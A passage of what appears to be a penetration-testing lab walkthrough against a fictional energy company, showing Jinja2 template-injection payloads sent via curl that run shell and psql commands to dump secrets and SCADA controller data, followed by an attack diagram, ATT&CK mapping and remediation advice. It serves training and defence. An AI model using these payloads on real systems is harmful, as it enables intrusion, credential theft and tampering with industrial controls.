+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;which psql mysql sqlite3 python3 2&gt;&amp;1&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>If <code>psql</code> is not available but <code>python3</code> is, you can use Python's <code>psycopg2</code> library (if installed) to connect to PostgreSQL. The walkthrough assumes <code>psql</code> is available. If not, adapt the commands to use Python.</p>
+<hr />
+<h3 id="phase-4-lateral-movement-to-the-engineering-database">Phase 4: Lateral Movement to the Engineering Database</h3>
+<p>You have the engineering database hostname, username, password, and database name from Phase 3. You have confirmed network connectivity and psql availability from the admin portal server. Now connect to the engineering database and extract the master flag.</p>
+<h4 id="step-21-connect-to-the-engineering-database">Step 21: Connect to the Engineering Database</h4>
+<p>Use the credentials discovered in Phase 3 to query the engineering database. Replace the hostname, username, password, and database name with the values you extracted:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - List tables in the engineering database</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;\\dt\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>\dt</code> command lists all tables in the database. Examine the output for tables related to:</p>
+<ul>
+<li><strong>SCADA configurations</strong>: <code>scada_controllers</code>, <code>plc_configs</code>, <code>sensor_arrays</code></li>
+<li><strong>Maintenance</strong>: <code>maintenance_schedules</code>, <code>firmware_updates</code></li>
+<li><strong>Secrets</strong>: <code>admin_secrets</code>, <code>credentials</code>, <code>flags</code></li>
+<li><strong>Users</strong>: <code>engineers</code>, <code>operators</code>, <code>admin_users</code></li>
+</ul>
+<p>Record every table name. The master flag is stored in one of these tables.</p>
+<h4 id="step-22-enumerate-table-schemas">Step 22: Enumerate Table Schemas</h4>
+<p>Describe the structure of the most interesting tables:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Describe the admin_secrets table</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;\\d admin_secrets\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>\d table_name</code> command describes a table's columns, data types, and constraints. Look for columns named <code>secret_key</code>, <code>secret_value</code>, <code>flag</code>, <code>token</code>, or similar.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Describe the scada_controllers table</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;\\d scada_controllers\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Document the schema of each table. The column names and data types reveal the purpose of each table and help you construct targeted queries.</p>
+<h4 id="step-23-query-for-the-master-flag">Step 23: Query for the Master Flag</h4>
+<p>Based on the table schemas, construct a query to extract the flag. If the table is <code>admin_secrets</code> with columns <code>secret_key</code> and <code>secret_value</code>:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Extract the master flag from admin_secrets</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -t -c \&quot;SELECT secret_value FROM admin_secrets WHERE secret_key=\\x27master_flag\\x27\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Note the escaping: <code>\\x27</code> represents a single quote inside the nested command string. The <code>-t</code> flag (tuples only) returns just the data value without column headers or row counts.</p>
+<p>If the flag is not in <code>admin_secrets</code>, try other tables:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Query all rows from admin_secrets</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;SELECT * FROM admin_secrets\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The full table dump shows all rows and helps you identify the correct <code>secret_key</code> value to filter on.</p>
+<h4 id="step-24-extract-additional-intelligence">Step 24: Extract Additional Intelligence</h4>
+<p>While you have database access, extract other high-value data to document the full impact:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Extract SCADA controller configurations</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;SELECT * FROM scada_controllers LIMIT 5\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>SCADA controller data includes IP addresses, firmware versions, protocol types (Modbus, DNP3, IEC 61850), and access credentials. In a real engagement, access to the data would represent a critical finding because it could enable direct manipulation of industrial control systems.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for additional credential tables</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;PGPASSWORD=Eng_DB_Pr0d_2024# psql -h engineering-db -U eng_admin -d engineering -c \&quot;SELECT table_name FROM information_schema.tables WHERE table_schema=\\x27public\\x27\&quot;&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>information_schema.tables</code> query lists every table in the database, including tables you may not have discovered through <code>\dt</code>. Record the complete table inventory.</p>
+<h4 id="step-25-verify-network-position">Step 25: Verify Network Position</h4>
+<p>Confirm the lateral movement path by checking the admin portal server's network configuration:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check network interfaces on the admin portal server</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;ip addr show 2&gt;/dev/null || ifconfig 2&gt;/dev/null&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check routing table</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;ip route show 2&gt;/dev/null || route -n 2&gt;/dev/null&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The network configuration reveals which subnets the admin portal server can reach. Multiple interfaces or routes indicate that the server bridges different network segments, explaining how it can reach both the LDAP server and the engineering database.</p>
+<h4 id="step-26-document-and-submit">Step 26: Document and Submit</h4>
+<p>Record the master flag and submit it on the platform. The flag format is <code>OCR{...}</code>.</p>
+<hr />
+<h2 id="complete-attack-chain-diagram">Complete Attack Chain Diagram</h2>
+<pre class="mermaid"><code>graph TD
+    subgraph Phase1["Phase 1: Initial Access"]
+        A1["Admin Portal&lt;br/&gt;Login Form"] --&gt;|"Username: s.chen&lt;br/&gt;Password: *"| A2["LDAP Filter:&lt;br/&gt;(&amp;(uid=s.chen)(userPassword=*))"]
+        A2 --&gt;|"Wildcard matches&lt;br/&gt;any password"| A3["Authentication&lt;br/&gt;Bypass"]
+        A3 --&gt; A4["Session Cookie&lt;br/&gt;Obtained"]
+    end
+
+    subgraph Phase2["Phase 2: Execution"]
+        B1["Report Generator&lt;br/&gt;Form"] --&gt;|"Title: {{7*7}}"| B2["SSTI Confirmed&lt;br/&gt;Output: 49"]
+        B2 --&gt;|"cycler.__init__&lt;br/&gt;.__globals__.os"| B3["RCE via&lt;br/&gt;os.popen()"]
+        B3 --&gt; B4["Full Command&lt;br/&gt;Execution"]
+    end
+
+    subgraph Phase3["Phase 3: Credential Access"]
+        C1["Read env vars&lt;br/&gt;via os.popen('env')"] --&gt; C2["ENG_DB_HOST&lt;br/&gt;ENG_DB_USER&lt;br/&gt;ENG_DB_PASS"]
+        C2 --&gt; C3["Eng_DB_Pr0d_2024#&lt;br/&gt;eng_admin@engineering"]
+    end
+
+    subgraph Phase4["Phase 4: Lateral Movement"]
+        D1["PGPASSWORD=...&lt;br/&gt;psql -h engineering-db"] --&gt; D2["List tables&lt;br/&gt;\\dt"]
+        D2 --&gt; D3["Query admin_secrets"]
+        D3 --&gt; D4["OCR{...}&lt;br/&gt;Master Flag"]
+    end
+
+    A4 --&gt; B1
+    B4 --&gt; C1
+    C3 --&gt; D1
+
+    style A1 fill:#00d4ff,color:#000
+    style A3 fill:#00d4ff,color:#000
+    style B2 fill:#6aaa64,color:#fff
+    style B4 fill:#6aaa64,color:#fff
+    style C2 fill:#e94560,color:#fff
+    style C3 fill:#e94560,color:#fff
+    style D3 fill:#ffd700,color:#000
+    style D4 fill:#ff6b6b,color:#fff</code></pre>
+<hr />
+<h2 id="record-your-findings">Record Your Findings</h2>
+<blockquote>
+<p><strong>Phase 1: LDAP Injection</strong></p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login endpoint</td>
+<td></td>
+</tr>
+<tr>
+<td>Error message (wrong password)</td>
+<td></td>
+</tr>
+<tr>
+<td>Error message (wrong username)</td>
+<td></td>
+</tr>
+<tr>
+<td>Injection payload (username)</td>
+<td></td>
+</tr>
+<tr>
+<td>Injection payload (password)</td>
+<td></td>
+</tr>
+<tr>
+<td>Session cookie name</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Phase 2: SSTI</strong></p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Report generator URL</td>
+<td></td>
+</tr>
+<tr>
+<td>Vulnerable field</td>
+<td></td>
+</tr>
+<tr>
+<td>Detection payload</td>
+<td></td>
+</tr>
+<tr>
+<td>Detection output</td>
+<td></td>
+</tr>
+<tr>
+<td>RCE payload</td>
+<td></td>
+</tr>
+<tr>
+<td>RCE output (id command)</td>
+<td></td>
+</tr>
+<tr>
+<td>Application user (uid)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Phase 3: Credential Discovery</strong></p>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ENG_DB_HOST</td>
+<td></td>
+</tr>
+<tr>
+<td>ENG_DB_USER</td>
+<td></td>
+</tr>
+<tr>
+<td>ENG_DB_PASS</td>
+<td></td>
+</tr>
+<tr>
+<td>ENG_DB_NAME</td>
+<td></td>
+</tr>
+<tr>
+<td>LDAP_HOST</td>
+<td></td>
+</tr>
+<tr>
+<td>SECRET_KEY</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Phase 4: Lateral Movement</strong></p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Database tables found</td>
+<td></td>
+</tr>
+<tr>
+<td>Target table</td>
+<td></td>
+</tr>
+<tr>
+<td>Target column</td>
+<td></td>
+</tr>
+<tr>
+<td>Query used</td>
+<td></td>
+</tr>
+<tr>
+<td>Master flag</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>SCADA intelligence extracted:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Controller</th>
+<th>IP Address</th>
+<th>Protocol</th>
+<th>Firmware</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Complete flag:</strong> <code>OCR{___________________________}</code></p>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The LDAP injection used <code>*</code> as the password, which matches any value. What LDAP authentication method would prevent this attack, and why?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Using an <strong>LDAP bind operation</strong> instead of a search filter prevents wildcard injection. In a bind operation, the application connects to the LDAP server as the user by providing the full Distinguished Name (DN) and password to the <code>ldap_bind()</code> function. The LDAP server verifies the password internally rather than through a search filter. The wildcard <code>*</code> is not interpreted as a special character during bind. Instead, the server treats it as a literal password value and rejects it because no account has <code>*</code> as its actual password. The search-filter approach (<code>(&amp;(uid=user)(userPassword=input))</code>) is inherently vulnerable because LDAP filter syntax includes special characters that the application must escape. The bind approach eliminates filter construction entirely.</p>
+<p>Additionally, input validation that rejects LDAP special characters (<code>*</code>, <code>(</code>, <code>)</code>, <code>\</code>, NUL) in username and password fields provides defense-in-depth. The Python <code>ldap</code> library includes <code>ldap.filter.escape_filter_chars()</code> for escaping, but switching to bind-based authentication is the stronger fix.</p>
+</details>
+<p><strong>2. The Jinja2 SSTI was exploited through <code>cycler.__init__.__globals__.os.popen()</code>. Explain each component of the chain and why a standard Jinja2 sandbox does not prevent it.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Breaking down the chain:</p>
+<ul>
+<li><code>cycler</code>: A Jinja2 global object available in all templates (used for CSS class cycling in loops)</li>
+<li><code>__init__</code>: The constructor method of the cycler class (a Python function object)</li>
+<li><code>__globals__</code>: A dictionary of all global variables in the module where <code>__init__</code> was defined</li>
+<li><code>os</code>: The Python <code>os</code> module, present in <code>__globals__</code> because the module imported it</li>
+<li><code>popen('id')</code>: Opens a subprocess and executes the shell command <code>id</code></li>
+<li><code>.read()</code>: Reads the subprocess output as a string</li>
+</ul>
+<p>The standard Jinja2 <code>Environment</code> does not restrict attribute access. It renders any valid Python expression, including dunder (double-underscore) attribute traversal. The <code>SandboxedEnvironment</code> restricts access to certain attributes and callable types, but it must be explicitly configured. Many applications use the standard <code>Environment</code> for performance or convenience, leaving them vulnerable to attribute-chain traversal. Even with <code>SandboxedEnvironment</code>, misconfigurations in the attribute blocklist can leave exploitable paths.</p>
+<p>The root cause is that user input should never be compiled as template code. The fix is to pass user input as a template variable (<code>template.render(title=user_input)</code>) rather than embedding it in the template string itself.</p>
+</details>
+<p><strong>3. Map the complete attack chain to the MITRE ATT&amp;CK framework. Identify the tactic and technique for each phase.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>ATT&amp;CK Tactic</th>
+<th>ATT&amp;CK Technique</th>
+<th>ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LDAP Injection</td>
+<td>Initial Access</td>
+<td>Exploit Public-Facing Application</td>
+<td>T1190</td>
+</tr>
+<tr>
+<td>SSTI Detection</td>
+<td>Discovery</td>
+<td>Application Layer Protocol (Web)</td>
+<td>T1071.001</td>
+</tr>
+<tr>
+<td>SSTI RCE</td>
+<td>Execution</td>
+<td>Command and Scripting Interpreter: Python</td>
+<td>T1059.006</td>
+</tr>
+<tr>
+<td>Environment Variable Read</td>
+<td>Credential Access</td>
+<td>Unsecured Credentials: Credentials in Files</td>
+<td>T1552.001</td>
+</tr>
+<tr>
+<td>Database Query</td>
+<td>Lateral Movement</td>
+<td>Exploitation of Remote Services</td>
+<td>T1210</td>
+</tr>
+<tr>
+<td>SCADA Data Extraction</td>
+<td>Collection</td>
+<td>Data from Information Repositories: Database</td>
+<td>T1213.002</td>
+</tr>
+<tr>
+<td>Flag Retrieval</td>
+<td>Exfiltration</td>
+<td>Exfiltration Over C2 Channel</td>
+<td>T1041</td>
+</tr>
+</tbody>
+</table>
+<p>The chain spans six of the fourteen ATT&amp;CK tactics: Initial Access, Discovery, Execution, Credential Access, Lateral Movement, and Collection. A single defender monitoring only one tactic (e.g., only watching for Initial Access indicators) would miss the subsequent phases. Effective detection requires monitoring at every stage of the kill chain, with particular attention to the Execution and Credential Access phases where SSTI and environment variable reads occur.</p>
+</details>
+<p><strong>4. Meridian Energy wants to fix all four vulnerabilities. Prioritize the remediations from most to least critical and justify the ordering.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p><strong>Priority 1: SSTI in the Report Generator (Execution)</strong></p>
+<p>SSTI provides arbitrary code execution on the server. Even if all other vulnerabilities are fixed, SSTI allows reading files, executing commands, and pivoting to any reachable system. Fix: refactor the report generator to pass user input as template variables, never as template code. Deploy a <code>SandboxedEnvironment</code> as a defense-in-depth measure.</p>
+<p><strong>Priority 2: Database Credentials in Environment Variables (Credential Access)</strong></p>
+<p>Credentials in environment variables are accessible through multiple attack vectors (SSTI, SSRF, LFI via <code>/proc/self/environ</code>). Even if SSTI is fixed, another vulnerability that reads environment data would expose the database. Fix: use a secrets manager (HashiCorp Vault, AWS Secrets Manager) that provides short-lived, scoped credentials. Remove static passwords from environment variables.</p>
+<p><strong>Priority 3: LDAP Injection (Initial Access)</strong></p>
+<p>LDAP injection provides the initial authentication bypass that starts the chain. However, it is less critical than SSTI because authentication bypass without a subsequent execution vector only grants access to the dashboard (information disclosure, not system compromise). Fix: switch to LDAP bind authentication and validate/escape all user input before filter construction.</p>
+<p><strong>Priority 4: Engineering Database Network Access (Lateral Movement)</strong></p>
+<p>The admin portal server can reach the engineering database directly. Network segmentation that prevents the web application tier from connecting to the OT database tier would break the final step of the chain. Fix: implement firewall rules that restrict database access to authorized application servers only, and require mutual TLS for database connections.</p>
+<p>The justification for this ordering: prioritize fixes that provide the most impact reduction. SSTI enables the widest range of post-exploitation activity. Credential storage affects multiple attack vectors. LDAP injection is the entry point but has limited impact without the subsequent chain. Network access is the final link but requires all prior steps to exploit.</p>
+</details>
+<hr />
+<h2 id="defensive-recommendations">Defensive Recommendations</h2>
+<h3 id="immediate-actions-fix-within-24-hours">Immediate Actions (Fix Within 24 Hours)</h3>
+<ol>
+<li>
+<p><strong>Patch the Report Generator</strong>: Refactor to use <code>template.render(title=user_input)</code> instead of <code>Template(f"Report: {user_input}")</code>. Deploy a <code>SandboxedEnvironment</code> as an additional safeguard.</p>
+</li>
+<li>
+<p><strong>Fix LDAP Authentication</strong>: Switch from search-filter authentication to LDAP bind operations. Implement input validation that rejects LDAP special characters.</p>
+</li>
+<li>
+<p><strong>Rotate Compromised Credentials</strong>: Change the engineering database password immediately. Rotate all credentials discovered during the engagement (SCADA credentials from Chapter 3, LDAP bind credentials, API tokens).</p>
+</li>
+</ol>
+<h3 id="short-term-actions-fix-within-1-week">Short-Term Actions (Fix Within 1 Week)</h3>
+<ol>
+<li>
+<p><strong>Implement a Secrets Manager</strong>: Move database credentials from environment variables to HashiCorp Vault or equivalent. Generate scoped, time-limited credentials for each application.</p>
+</li>
+<li>
+<p><strong>Deploy Network Segmentation</strong>: Place the engineering database on a separate network segment. Restrict access to authorized application servers only, using firewall rules and mutual TLS.</p>
+</li>
+<li>
+<p><strong>Harden the LDAP Server</strong>: Enable LDAP over TLS (LDAPS), restrict anonymous queries, implement account lockout after failed authentication attempts.</p>
+</li>
+</ol>
+<h3 id="long-term-actions-fix-within-1-month">Long-Term Actions (Fix Within 1 Month)</h3>
+<ol>
+<li>
+<p><strong>Web Application Firewall (WAF)</strong>: Deploy a WAF in front of the admin portal that detects and blocks SSTI payloads, LDAP injection syntax, and anomalous request patterns.</p>
+</li>
+<li>
+<p><strong>Security Code Review</strong>: Audit all web applications in the Meridian Energy network for SSTI, injection, and insecure credential storage. Prioritize applications that handle authentication or access OT systems.</p>
+</li>
+<li>
+<p><strong>Penetration Test Cadence</strong>: Establish quarterly penetration testing with a scope that includes both IT and OT-adjacent systems. Require remediation within defined SLAs based on severity.</p>
+</li>
+<li>
+<p><strong>Monitoring and Detection</strong>: Deploy logging and alerting for LDAP authentication anomalies (wildcard characters in queries), template rendering errors (stack traces from SSTI attempts), and unexpected database connections from the web tier.</p>
+</li>
+</ol>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>
+<p><strong>Vulnerability chaining transforms moderate findings into critical compromises.</strong> LDAP injection, SSTI, credential leakage, and network access are each moderate-severity issues. Chained together, they provide full database access and SCADA intelligence extraction.</p>
+</li>
+<li>
+<p><strong>LDAP injection through wildcard characters is trivial to exploit and trivial to prevent.</strong> The fix (bind authentication or input escaping) is well-documented and takes minutes to implement. The vulnerability persists because developers do not know it exists.</p>
+</li>
+<li>
+<p><strong>SSTI is one of the most dangerous web vulnerabilities.</strong> Template injection provides the same impact as remote code execution: arbitrary command execution, file access, credential theft, and lateral movement. Any application that compiles user input as template code is vulnerable.</p>
+</li>
+<li>
+<p><strong>Environment variables are not secrets management.</strong> Credentials in environment variables are accessible through file reads (<code>/proc/self/environ</code>), SSTI, SSRF, and application misconfiguration. A dedicated secrets manager limits exposure by providing scoped, time-limited credentials.</p>
+</li>
+<li>
+<p><strong>Lateral movement to OT databases is the real-world impact.</strong> The flag in this exercise represents SCADA controller access. In a real energy company, the same attack chain would provide the ability to read and potentially modify industrial control system configurations. The consequences range from data theft to physical infrastructure disruption.</p>
+</li>
+<li>
+<p><strong>Defense requires controls at every layer.</strong> No single fix prevents the complete chain. Input validation stops LDAP injection. Secure template rendering stops SSTI. Secrets management limits credential exposure. Network segmentation prevents lateral movement. Effective security implements all four.</p>
+</li>
+<li>
+<p><strong>Document everything during an engagement.</strong> Each phase of this exercise produced evidence (error messages, configuration data, credentials, network topology) that informed the next phase. Thorough documentation is not optional; it is the difference between a successful engagement and a dead end.</p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
